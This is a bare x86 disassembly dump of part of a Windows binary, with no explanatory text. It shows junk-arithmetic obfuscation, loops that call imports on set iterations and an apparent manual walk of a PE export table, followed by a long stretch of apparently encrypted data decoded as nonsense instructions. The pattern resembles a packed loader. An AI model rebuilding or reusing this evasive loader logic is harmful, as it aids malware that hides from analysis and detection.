  40c2f2:	sbb    DWORD PTR ds:0x433873,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x43386b
  40c301:	adc    DWORD PTR ds:0x43387b,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x4337cb
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433807
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x433863
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x4337af,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x433827,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x4337b3,0x4337e7
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x43387f,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x43387f
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x43387f,ecx
  40c367:	cmp    DWORD PTR ds:0x43387f,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x43387f,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x43387f
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x43387f,ecx
  40c399:	cmp    DWORD PTR ds:0x43387f,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x4337eb
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x43382b,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x43382b,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x4338ab,0x4338bb
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x43382f,0x43383f
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x433843,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x4337b7,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x4337ab,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x4337af,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x4337a3,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x433867,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x433873,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x433827,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x43386b,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x43386b
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x43386b,ecx
  40c47f:	cmp    DWORD PTR ds:0x43386b,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x43386b,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x43386b,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x43386b
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x43386b,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x43386b
  40c4ce:	and    esi,DWORD PTR ds:0x43386f
  40c4d4:	mov    DWORD PTR ds:0x43386b,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x43383b,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433803,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x4337ef,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x43387b,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x43386b,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x433873,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x710d5658
  40c577:	repz call 0x7d7d:0x7e7e8118
  40c57f:	jle    0x40c5ff
  40c581:	xor    eax,0xaa0fe62f
  40c586:	pushf  
  40c587:	ds icebp 
  40c589:	jo     0x40c5ea
  40c58b:	ins    DWORD PTR es:[edi],dx
  40c58c:	xlat   BYTE PTR ds:[ebx]
  40c58d:	test   al,0x78
  40c58f:	mov    al,ds:0x5202e80
  40c594:	adc    DWORD PTR [eax-0x65],edi
  40c597:	lea    eax,[edx]
  40c599:	popa   
  40c59a:	cmc    
  40c59b:	xchg   BYTE PTR [edi-0x70a26526],dl
  40c5a1:	cmp    dl,BYTE PTR [eax+eiz*8-0x49b9b4d9]
  40c5a8:	add    BYTE PTR [eax-0x6ccbc20d],0x47
  40c5af:	dec    ebx
  40c5b0:	out    dx,al
  40c5b1:	retf   0x511a
  40c5b4:	xor    BYTE PTR [esi],bh
  40c5b6:	add    al,0xa4
  40c5b8:	pop    esi
  40c5b9:	ins    BYTE PTR es:[edi],dx
  40c5ba:	lahf   
  40c5bb:	rcr    DWORD PTR [edx*2+0x576044c3],1
  40c5c2:	push   ds
  40c5c3:	popa   
  40c5c4:	out    dx,eax
  40c5c5:	sahf   
  40c5c6:	jge    0x40c5f3
  40c5c8:	(bad)  
  40c5c9:	cmp    al,0xa6
  40c5cb:	push   esi
  40c5cc:	add    ebp,edi
  40c5ce:	enter  0x53d4,0x6c
  40c5d2:	xor    ch,BYTE PTR [ecx+ebp*8]
  40c5d5:	push   edx
  40c5d6:	mov    esp,DWORD PTR ds:0x77d8afea
  40c5dc:	stc    
  40c5dd:	pop    ebx
  40c5de:	sub    eax,ecx
  40c5e0:	push   esi
  40c5e1:	xor    BYTE PTR [ebp-0x29],bl
  40c5e4:	fmulp  st(1),st
  40c5e6:	repz sub ch,BYTE PTR es:[ebx+0x74]
  40c5eb:	push   ecx
  40c5ec:	pop    edx
  40c5ed:	loope  0x40c611
  40c5ef:	xchg   edi,eax
  40c5f0:	push   ecx
  40c5f1:	pop    bx
  40c5f3:	fs aas 
  40c5f5:	inc    esi
  40c5f6:	fistp  WORD PTR [ecx]
  40c5f8:	push   0x59f7342d
  40c5fd:	dec    ebx
  40c5fe:	es and eax,0xffffff8c
  40c602:	(bad)  
  40c603:	retf   0x57d5
  40c606:	cmc    
  40c607:	cmp    BYTE PTR ds:0xa14286d3,0xb4
  40c60e:	or     DWORD PTR [ecx+ecx*8+0x2],0xffffffcc
  40c613:	out    0x98,al
  40c615:	mov    ebp,0x5735d2d9
  40c61a:	test   DWORD PTR [esi-0x6d],eax
  40c61d:	push   ecx
  40c61e:	mov    ds,WORD PTR [ecx+eax*4+0x5c]
  40c622:	pop    ss
  40c623:	xor    DWORD PTR [edi+esi*8],edi
  40c626:	sub    DWORD PTR [esi-0x52e19a29],edi
  40c62c:	pushf  
  40c62d:	(bad)  
  40c62f:	dec    eax
  40c630:	jle    0x40c68f
  40c632:	jne    0x40c68b
  40c634:	enter  0x8eb2,0xf6
  40c638:	aaa    
  40c639:	neg    DWORD PTR [eax-0x33b848fc]
  40c63f:	out    0x8b,eax
  40c641:	pop    ebx
  40c642:	cmp    ebx,DWORD PTR [eax+eiz*2+0x17c7c5be]
  40c649:	cmp    eax,0x2cec5b72
  40c64e:	mul    eax
  40c650:	dec    ebx
  40c651:	mov    BYTE PTR [ebx+0x3f69bcb1],ch
  40c657:	push   0x3f
  40c659:	xchg   esp,eax
  40c65a:	push   cs
  40c65b:	and    eax,0xf818f57f
  40c660:	xchg   edx,eax
  40c661:	or     eax,0x51ec1d81
  40c666:	sbb    dh,al
  40c668:	mov    dh,ah
  40c66a:	push   0xffffffe5
  40c66c:	fstp   QWORD PTR [eax]
  40c66e:	sahf   
  40c66f:	or     BYTE PTR [esi+0x64ff9de],al
  40c675:	and    bh,ah
  40c677:	ficom  WORD PTR [edx+0x55]
  40c67a:	xchg   BYTE PTR es:[esi],bl
  40c67d:	adc    BYTE PTR [edi],al
  40c67f:	sub    edx,esi
  40c681:	cmp    DWORD PTR [ecx-0x7a7d6dab],esp
  40c687:	ficomp DWORD PTR [ecx-0x48]
  40c68a:	xor    al,0x3d
  40c68c:	rcr    DWORD PTR [edi-0x60],1
  40c68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c690:	mov    ds:0x1545a1a3,eax
  40c695:	idiv   DWORD PTR [ebx-0x170c1e3]
  40c69b:	jle    0x40c65f
  40c69d:	mov    ah,0xda
  40c69f:	dec    esi
  40c6a0:	mov    ch,0x1c
  40c6a2:	jle    0x40c6dd
  40c6a4:	icebp  
  40c6a5:	mov    ebp,0xa66c4bf1
  40c6aa:	mov    esp,0x333b0c49
  40c6af:	ret    
  40c6b0:	inc    eax
  40c6b1:	out    0x19,eax
  40c6b3:	mov    WORD PTR [edx-0x761997aa],es
  40c6b9:	bound  ebx,QWORD PTR [ebx]
  40c6bb:	test   BYTE PTR [esi],bl
  40c6bd:	push   0xffffffed
  40c6bf:	inc    edi
  40c6c0:	stos   DWORD PTR es:[edi],eax
  40c6c1:	shl    BYTE PTR fs:[esi-0x23bdf727],1
  40c6c8:	mov    ch,0xf2
  40c6ca:	adc    ebp,DWORD PTR [edi+0x4aaf8eb6]
  40c6d0:	cmp    al,0x8
  40c6d2:	push   esp
  40c6d3:	out    dx,eax
  40c6d4:	dec    esp
  40c6d5:	push   eax
  40c6d6:	pop    ebx
  40c6d7:	push   esp
  40c6d8:	xor    al,BYTE PTR [ebx]
  40c6da:	fimul  DWORD PTR [edx+0x46]
  40c6dd:	in     al,dx
  40c6de:	std    
  40c6df:	adc    dl,BYTE PTR [edx+0x95ea4fc]
  40c6e5:	sub    al,0xc0
  40c6e7:	out    0xf,al
  40c6e9:	out    0x92,eax
  40c6eb:	jmp    0xa70e866b
  40c6f0:	dec    ebp
  40c6f1:	cmp    DWORD PTR [ebp+0x27],esp
  40c6f4:	or     BYTE PTR [ecx],ch
  40c6f6:	dec    esi
  40c6f7:	popa   
  40c6f8:	mov    edx,0xdb1280f9
  40c6fd:	dec    ebx
  40c6fe:	xchg   ebx,eax
  40c6ff:	imul   eax,DWORD PTR [ecx+0x5a3f68a5],0x372a637c
  40c709:	mov    edx,0xbe178372
  40c70e:	cmp    DWORD PTR [edx-0x17bac38c],ebp
  40c714:	mov    ds:0x56bcb3da,al
  40c719:	popa   
  40c71a:	shr    BYTE PTR [edx+0x8],1
  40c71d:	add    bh,BYTE PTR ds:0x4a54535c
  40c723:	pop    es
  40c724:	aas    
  40c725:	popa   
  40c726:	out    dx,al
  40c727:	adc    BYTE PTR [edi-0x3f],0x9e
  40c72b:	out    dx,eax
  40c72c:	ror    edx,1
  40c72e:	cli    
  40c72f:	xchg   edi,eax
  40c730:	or     ebp,DWORD PTR ds:0x87de6554
  40c736:	dec    ebx
  40c737:	(bad)  
  40c738:	and    eax,0xec664ada
  40c73d:	setbe  BYTE PTR [ecx+0x5f]
  40c741:	loop   0x40c79d
  40c743:	pop    esi
  40c744:	imul   ebp,DWORD PTR [edi],0xfffffff4
  40c747:	and    edi,DWORD PTR [ecx-0x1ed96700]
  40c74d:	xchg   esi,eax
  40c74e:	lahf   
  40c74f:	sub    ah,ah
  40c751:	clc    
  40c752:	mov    esp,DWORD PTR [edi+ebx*1-0x60162e4c]
  40c759:	cdq    
  40c75a:	sub    BYTE PTR [edi],bh
  40c75c:	mov    dh,0xc5
  40c75e:	pmulhw mm1,QWORD PTR [ecx+0x3e]
  40c762:	lock jge 0x40c731
  40c765:	sahf   
  40c766:	pop    edi
  40c767:	popa   
  40c768:	xor    eax,0xe895c583
  40c76d:	or     BYTE PTR [eax+0x25],bl
  40c770:	mov    edi,0x7a87cd0a
  40c775:	mov    ecx,0x8f99ccb3
  40c77a:	pop    ds
  40c77b:	dec    eax
  40c77c:	sbb    DWORD PTR [ecx-0x3b273907],ecx
  40c782:	and    DWORD PTR [ebp+0x66],edx
  40c785:	mov    edx,0xd13d0ec4
  40c78a:	push   edi
  40c78b:	shl    DWORD PTR [eax],0xf5
  40c78e:	call   0x3d5:0xbf168bdb
  40c795:	leave  
  40c796:	or     al,0x75
  40c798:	sbb    bh,BYTE PTR [eax]
  40c79a:	push   edx
  40c79b:	fcomip st,st(1)
  40c79d:	test   BYTE PTR [ecx],dh
  40c79f:	shl    BYTE PTR [esi],0xab
  40c7a2:	das    
  40c7a3:	mov    bh,bh
  40c7a5:	jne    0x40c76e
  40c7a7:	aas    
  40c7a8:	fsubr  DWORD PTR [edx+eiz*2+0x10]
  40c7ac:	cdq    
  40c7ad:	fwait
  40c7ae:	push   edx
  40c7af:	leave  
  40c7b0:	adc    BYTE PTR [ebp-0x48],ah
  40c7b3:	(bad)  
  40c7b4:	dec    eax
  40c7b5:	and    eax,0x29861e79
  40c7ba:	test   dl,cl
  40c7bc:	push   0xc1b7fa02
  40c7c1:	cmp    BYTE PTR [esi-0x78],cl
  40c7c4:	fwait
  40c7c5:	loop   0x40c834
  40c7c7:	dec    ebp
  40c7c8:	idiv   dh
  40c7ca:	pop    edx
  40c7cb:	ror    DWORD PTR [esi+0x63a6bdd3],cl
  40c7d1:	les    edi,FWORD PTR [esi+0x5f]
  40c7d4:	dec    edx
  40c7d5:	mov    al,ds:0xb9d40422
  40c7da:	push   ebp
  40c7db:	rol    BYTE PTR [edx+0x6eb9758c],cl
  40c7e1:	lods   eax,DWORD PTR ds:[esi]
  40c7e2:	(bad)  
  40c7e3:	or     al,BYTE PTR [edi]
  40c7e5:	xchg   esi,eax
  40c7e6:	pop    ecx
  40c7e7:	add    DWORD PTR [edx-0x41],edx
  40c7ea:	mov    ds:0x9f1f1086,al
  40c7ef:	out    0x34,eax
  40c7f1:	mov    ds:0x3fe37e05,eax
  40c7f6:	ins    BYTE PTR es:[edi],dx
  40c7f7:	or     ebx,DWORD PTR ds:0x83e37e7d
  40c7fd:	inc    edi
  40c7fe:	aas    
  40c7ff:	ret    
  40c800:	xchg   ebp,eax
  40c801:	push   es
  40c802:	jmp    0x40c833
  40c804:	adc    DWORD PTR [ecx],esi
  40c806:	push   0xf6b4881e
  40c80b:	nop
  40c80c:	cwde   
  40c80d:	neg    bh
  40c80f:	jb     0x40c80e
  40c811:	test   dl,bl
  40c813:	int    0x12
  40c815:	or     DWORD PTR [ecx-0x5],ebp
  40c818:	fwait
  40c819:	inc    edx
  40c81a:	jecxz  0x40c80b
  40c81c:	ficomp WORD PTR [esi+0x540fa300]
  40c822:	(bad)  
  40c823:	pop    ebx
  40c824:	inc    eax
  40c825:	jmp    0x40c872
  40c827:	pop    esi
  40c828:	or     eax,0x7b94447c
  40c82d:	mov    ds:0xdb128691,eax
  40c832:	mov    bh,0x23
  40c834:	or     al,0x79
  40c836:	or     bh,ah
  40c838:	xor    BYTE PTR [edx+0x18],dh
  40c83b:	add    edx,esp
  40c83d:	scas   al,BYTE PTR es:[edi]
  40c83e:	ret    
  40c83f:	mov    bl,0xb4
  40c841:	inc    edi
  40c842:	es sub eax,0xa04188aa
  40c848:	adc    al,0x85
  40c84a:	sub    al,0x76
  40c84c:	jo     0x40c7f6
  40c84e:	adc    al,0x7f
  40c850:	xchg   BYTE PTR [edi-0x66],al
  40c853:	rcr    BYTE PTR [ebx],0x24
  40c856:	xchg   edx,eax
  40c857:	shl    DWORD PTR [edi-0x20],0x95
  40c85b:	in     eax,0xff
  40c85d:	mov    ah,BYTE PTR [esi+0x57544b07]
  40c863:	pop    esp
  40c864:	scas   eax,DWORD PTR es:[edi]
  40c865:	mov    edx,0x6d4910e0
  40c86a:	fbstp  TBYTE PTR [edx+0x7f]
  40c86d:	jg     0x40c803
  40c86f:	fdivr  st,st(3)
  40c871:	or     eax,0x9200ea2d
  40c876:	and    bl,BYTE PTR ds:0x58b437e
  40c87c:	mov    al,BYTE PTR [edi-0x7d]
  40c87f:	xchg   esp,eax
  40c880:	adc    DWORD PTR [ebx+0x458b7e08],esp
  40c886:	in     al,dx
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	repz pop eax
  40c8b4:	bound  edx,QWORD PTR ds:0x7e7e8c27
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	xchg   ecx,eax
  40c8bf:	cmp    BYTE PTR [ebx+0x30],dh
  40c8c2:	ss mov edi,0x593bc611
  40c8c8:	jmp    0xc74f9caf
  40c8cd:	jne    0x40c8e5
  40c8cf:	ror    esp,cl
  40c8d1:	jns    0x40c8a1
  40c8d3:	stos   DWORD PTR es:[edi],eax
  40c8d4:	sbb    BYTE PTR [ebp-0x4920dd50],bl
  40c8da:	repnz sbb al,0x9d
  40c8dd:	popa   
  40c8de:	add    DWORD PTR [edx+esi*2-0x58],ecx
  40c8e2:	mov    esi,0x5c1c3276
  40c8e7:	aam    0x60
  40c8e9:	sub    al,0xb4
  40c8eb:	sub    edx,DWORD PTR [edx-0x38]
  40c8ee:	push   ds
  40c8ef:	retf   
  40c8f0:	shl    BYTE PTR [edx-0x21],cl
  40c8f3:	in     al,0xc9
  40c8f5:	sbb    al,0xf7
  40c8f7:	push   esi
  40c8f8:	sbb    cl,dh
  40c8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8fb:	pushf  
  40c8fc:	jno    0x40c899
  40c8fe:	inc    esi
  40c8ff:	cmc    
  40c900:	or     eax,0x3e9c3342
  40c905:	inc    ecx
  40c906:	jne    0x40c8a1
  40c908:	add    al,0x82
  40c90a:	jp     0x40c91c
  40c90c:	or     BYTE PTR fs:[ecx],0xc6
  40c910:	out    dx,eax
  40c911:	or     BYTE PTR [ecx],ah
  40c913:	or     eax,0x4ef9c368
  40c918:	mov    ah,0x83
  40c91a:	in     eax,0xec
  40c91c:	aaa    
  40c91d:	dec    edx
  40c91e:	xlat   BYTE PTR ds:[ebx]
  40c91f:	nop
  40c920:	jle    0x40c95b
  40c922:	jmp    0x700a4fbc
  40c927:	enter  0xa7a6,0x31
  40c92b:	iret   
  40c92c:	sub    edi,DWORD PTR [esi+0x7d]
  40c92f:	frstpm(287 only) 
  40c931:	rcl    BYTE PTR [ecx],1
  40c933:	popa   
  40c934:	xlat   BYTE PTR ds:[ebx]
  40c935:	pop    edx
  40c936:	push   ebp
  40c937:	lods   al,BYTE PTR ds:[esi]
  40c938:	lock inc DWORD PTR [esi-0x6b]
  40c93c:	es inc edx
  40c93e:	adc    esi,edx
  40c940:	add    ecx,DWORD PTR [esp+eiz*8-0x69f02024]
  40c947:	sbb    al,0x47
  40c949:	loop   0x40c9b4
  40c94b:	dec    ecx
  40c94c:	add    BYTE PTR [ebx+0x7986dda1],0xdc
  40c953:	call   0x3373:0x71dbe13c
  40c95a:	adc    DWORD PTR [edi+0x7b],eax
  40c95d:	jmp    0x4f55c62d
  40c962:	sbb    DWORD PTR [ecx],edi
  40c964:	stc    
  40c965:	nop
  40c966:	add    eax,0x403a1a76
  40c96b:	cmp    DWORD PTR [ecx],0xffffffcd
  40c96e:	mov    ebp,0xd05cf198
  40c973:	sub    al,0xf4
  40c975:	jge    0x40c991
  40c977:	add    BYTE PTR [edi],cl
  40c979:	bound  ecx,QWORD PTR [ebp-0x747a4db1]
  40c97f:	inc    bh
  40c981:	cdq    
  40c982:	mov    cl,0x79
  40c984:	jle    0x40c90e
  40c986:	sub    DWORD PTR ds:0x76edfcd2,eax
  40c98c:	push   esi
  40c98d:	pop    esi
  40c98e:	leave  
  40c98f:	push   eax
  40c990:	and    BYTE PTR [ebp-0x19],cl
  40c993:	adc    BYTE PTR [edx+esi*2+0x894d0ab],0xdd
  40c99b:	jo     0x40c9d8
  40c99d:	clc    
  40c99e:	pushf  
  40c99f:	dec    esi
  40c9a0:	jnp    0x40c997
  40c9a2:	xchg   esi,eax
  40c9a3:	popa   
  40c9a4:	jmp    0x50c1c826
  40c9a9:	inc    edi
  40c9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ab:	clc    
  40c9ac:	mov    edi,0x20865fc3
  40c9b1:	push   DWORD PTR [esp+edx*4-0x4de396a9]
  40c9b8:	in     al,0xb8
  40c9ba:	push   eax
  40c9bb:	mov    ebx,0x43e74831
  40c9c0:	scas   al,BYTE PTR es:[edi]
  40c9c1:	icebp  
  40c9c2:	(bad)  
  40c9c3:	pusha  
  40c9c4:	adc    BYTE PTR [edi*1+0x48f78229],0x24
  40c9cc:	clc    
  40c9cd:	test   ecx,ebp
  40c9cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d1:	adc    al,0xe8
  40c9d3:	fisttp WORD PTR [edx+esi*8+0x7992c6e]
  40c9da:	cmp    ch,BYTE PTR [edx+0x224cd572]
  40c9e0:	pop    esi
  40c9e1:	cdq    
  40c9e2:	pop    dx
  40c9e4:	in     al,0x55
  40c9e6:	test   al,0xf6
  40c9e8:	inc    edx
  40c9e9:	aas    
  40c9ea:	push   edx
  40c9eb:	jg     0x40c9bd
  40c9ed:	in     eax,0x3
  40c9ef:	cdq    
  40c9f0:	sub    bh,BYTE PTR [ecx-0x5c]
  40c9f3:	cmp    ah,bh
  40c9f5:	inc    eax
  40c9f6:	and    DWORD PTR [ebx-0x285afce],ebx
  40c9fc:	test   eax,0x667541d2
  40ca01:	cwde   
  40ca02:	dec    esi
  40ca03:	outs   dx,BYTE PTR ds:[esi]
  40ca04:	(bad)  
  40ca05:	loopne 0x40ca50
  40ca07:	inc    edx
  40ca08:	jbe    0x40ca1b
  40ca0a:	mov    bl,0xff
  40ca0c:	pusha  
  40ca0d:	das    
  40ca0e:	inc    esi
  40ca0f:	dec    edx
  40ca10:	test   ebx,ecx
  40ca12:	ins    BYTE PTR es:[edi],dx
  40ca13:	pop    ebp
  40ca14:	js     0x40ca6c
  40ca16:	xchg   BYTE PTR [eax],ah
  40ca18:	out    0x24,eax
  40ca1a:	sti    
  40ca1b:	js     0x40ca84
  40ca1d:	pop    ds
  40ca1e:	out    dx,eax
  40ca1f:	es push 0x75
  40ca22:	stc    
  40ca23:	jae    0x40ca02
  40ca25:	jg     0x40ca12
  40ca27:	les    edx,FWORD PTR [ebp+0x52]
  40ca2a:	inc    ebx
  40ca2b:	ret    0xf046
  40ca2e:	frstor [esi]
  40ca30:	add    eax,eax
  40ca32:	enter  0x98d7,0xdc
  40ca36:	les    eax,FWORD PTR [edx]
  40ca38:	sbb    DWORD PTR [edi],ebx
  40ca3a:	pcmpgtd mm1,QWORD PTR [ebx+0x49d2d165]
  40ca41:	test   BYTE PTR [esp+eiz*8+0x758f2b8d],cl
  40ca48:	in     eax,0x54
  40ca4a:	push   es
  40ca4b:	pop    edx
  40ca4c:	iret   
  40ca4d:	or     eax,0x5b2cc467
  40ca52:	out    dx,eax
  40ca53:	xchg   ecx,eax
  40ca54:	pop    ecx
  40ca55:	pop    esi
  40ca56:	adc    al,0x4b
  40ca58:	pushf  
  40ca59:	and    cl,BYTE PTR [esi]
  40ca5b:	push   cs
  40ca5c:	mul    DWORD PTR [ecx+0x4d98d601]
  40ca62:	ret    0x9396
  40ca65:	dec    esp
  40ca66:	sub    BYTE PTR [ecx-0x288bd9e7],cl
  40ca6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca6d:	ja     0x40cabb
  40ca6f:	jnp    0x40ca8e
  40ca71:	test   al,0x91
  40ca73:	jbe    0x40ca7b
  40ca75:	push   0x63
  40ca77:	jo     0x40ca81
  40ca79:	rcl    DWORD PTR [eax-0x33],0xb7
  40ca7d:	lock adc ah,BYTE PTR [ecx]
  40ca80:	mov    esp,0xf087090c
  40ca85:	dec    esi
  40ca86:	std    
  40ca87:	or     BYTE PTR [ecx-0x14],ch
  40ca8a:	pushf  
  40ca8b:	push   ds
  40ca8c:	jbe    0x40cb0d
  40ca8e:	xchg   esp,eax
  40ca8f:	in     eax,0x37
  40ca91:	jo     0x40cb0c
  40ca93:	jae    0x40ca64
  40ca95:	out    0xd0,al
  40ca97:	mov    ebx,0xcad3cd53
  40ca9c:	xor    al,0x2f
  40ca9e:	cmp    edx,ebp
  40caa0:	adc    DWORD PTR [ebp+0x2593d415],eax
  40caa6:	push   edx
  40caa7:	cmp    BYTE PTR [esi],ah
  40caa9:	retf   
  40caaa:	mov    al,0xbe
  40caac:	ja     0x40cabb
  40caae:	add    esp,0xffffffb4
  40cab1:	adc    dh,BYTE PTR [ebx-0x16]
  40cab4:	es pop esp
  40cab6:	jmp    0x1624:0x500e5ba7
  40cabd:	mov    ah,0x1
  40cabf:	loopne 0x40caa8
  40cac1:	lds    edi,FWORD PTR [eax-0x3fae0a22]
  40cac7:	into   
  40cac8:	jmp    0x77330cef
  40cacd:	mov    bh,0x8d
  40cacf:	xor    ah,BYTE PTR [eax+ecx*8-0x76]
  40cad3:	dec    eax
  40cad4:	scas   al,BYTE PTR es:[edi]
  40cad5:	retf   0x9521
  40cad8:	cwde   
  40cad9:	loope  0x40ca6b
  40cadb:	xor    esi,DWORD PTR [esi-0x42]
  40cade:	adc    eax,edx
  40cae0:	sub    edi,DWORD PTR ds:0xa4c57269
  40cae6:	loope  0x40caa0
  40cae8:	xchg   ecx,eax
  40cae9:	fldcw  WORD PTR [eax+eiz*2+0x6f6ecb4]
  40caf0:	into   
  40caf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caf2:	mov    WORD PTR [ebx+edx*8],?
  40caf5:	gs cmp al,0x1
  40caf8:	mov    al,0xe2
  40cafa:	pushf  
  40cafb:	ins    BYTE PTR es:[edi],dx
  40cafc:	lahf   
  40cafd:	dec    ecx
  40cafe:	pop    edi
  40caff:	sub    DWORD PTR [ebp-0x57],ebx
  40cb02:	lock push ebp
  40cb04:	test   eax,0xfb382d43
  40cb09:	xchg   esp,eax
  40cb0a:	cmp    ecx,DWORD PTR [ebp-0x56765460]
  40cb10:	ins    DWORD PTR es:[edi],dx
  40cb11:	dec    edx
  40cb12:	add    ebx,DWORD PTR [ecx]
  40cb14:	jl     0x40cb57
  40cb16:	or     ebx,DWORD PTR [eax-0x3b4b3aae]
  40cb1c:	mov    cl,0x3b
  40cb1e:	hlt    
  40cb1f:	sub    DWORD PTR [eax+ecx*1+0x34d96532],eax
  40cb26:	jl     0x40cba7
  40cb28:	loopne 0x40cb44
  40cb2a:	mov    eax,0xcc433636
  40cb2f:	adc    ch,BYTE PTR [ecx+0x29]
  40cb32:	and    cl,BYTE PTR ds:0xce1b4b80
  40cb38:	ins    BYTE PTR es:[edi],dx
  40cb39:	mov    esi,0x15c7ce08
  40cb3e:	pushf  
